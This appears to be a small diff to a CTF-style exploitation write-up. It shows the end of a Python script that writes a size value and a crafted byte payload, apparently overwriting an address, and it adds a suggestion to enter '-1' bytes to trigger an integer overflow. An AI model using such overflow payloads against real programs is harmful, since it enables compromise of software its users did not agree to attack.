@@ -11,4 +11,4 @@ payload+=b"\xd1\x1b\x40"
 sys.stdout.buffer.write(str(sz).encode() + b"\n" + payload)
 ```
 
-try entering "-1" bytes to see if we can overflow the number ()
+try entering "-1" bytes to see if we can overflow the number (for example, a -1 in dword can be displayed )
